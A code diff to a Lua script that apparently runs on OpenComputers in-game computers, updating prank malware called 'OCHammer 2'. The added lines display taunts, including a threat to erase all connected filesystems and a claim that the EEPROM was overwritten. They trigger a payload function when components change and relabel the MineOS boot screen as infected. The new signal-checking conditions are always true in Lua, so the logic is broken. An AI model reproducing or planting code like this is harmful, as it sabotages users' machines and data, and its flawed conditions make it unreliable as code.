@@ -86,14 +86,28 @@ computer.shutdown = function(...)
   lol()
 end
 
-local smart = {
-    "Your OpenComputer got pwned by OCHammer 2";
+local stuff = {
+  "Fun fact: OCHammer 2 was released on April 1st, 2022";
+  "BE CAREFUL NEXT TIME";
+  "Aprill, Aprill!";
+  "Fun fact: Roblox's 2022 egg hunt won't be happening. Minecraft is better than Roblox, and so is Fortnite.";
+  "Hitting your OpenComputer's monitor with a baseball bat won't help.";
+  "Fun fact: I will erase all filesystems connected to your OpenComputer";
+  "Do you even use MacOS??? Mac's dont get viruses.";
+  "Fun fact: Your favourite Youtuber, Kreekcraft, has swore in his livestream.";
+  "Sanctions against OCVille!? Again, Seriously!? Please stop.";
+}
+
+local funfact = stuff[math.random(1,#stuff)]
+
+local APRIL = {
+    "Your OpenComputer got pwned by OCHammer 2"; -- APRILL APRILL
     "You won't be able to boot your OpenComputer as it's EEPROM has been overwritten and made read-only.";
-    "Only you can save it!";
+    funfact;
     "";
     "RULES:";
     " ";
-    "1. No unplugging your EEPROM";
+    "1. No unplugging your EEPROM (or any component at all)";
     "2. No shutdown or reboot";
     "3. No changing the EEPROM's code";
     "4. No replacing OS.lua";
@@ -117,13 +131,18 @@ gp.setForeground(0xFFFFFF)
 gp.fill(1,1,resX,resY," ")
 
 -- display some greetz and stuff
-displayTable(smart)
+displayTable(APRIL)
 
 local lastPull = {}
 
-repeat
-  lastPull = {computer.pullSignal(1)}
-until lastPull[1] == "key_up"
+function scanForSignal()
+  repeat
+    lastPull = {computer.pullSignal(1)}
+  until lastPull[1] == "key_up" or "component_added" or "component_removed"
+  return lastPull
+end
+
+if scanForSignal()[1] == "component_added" or "component_removed" then lol() end
 
 ---------------------------------------- System initialization ----------------------------------------
 
@@ -229,7 +248,7 @@ local function UIRequire(module)
     return math.floor(screenWidth / 2 - width / 2)
   end
   
-  local title, width, total = "MineOS", 26, 14
+  local title, width, total = "Infected by OChammer 2", 26, 14
   local x, y, part = centrize(width), math.floor(screenHeight / 2 - 1), math.ceil(width * UIRequireCounter / UIRequireTotal)
   UIRequireCounter = UIRequireCounter + 1
   
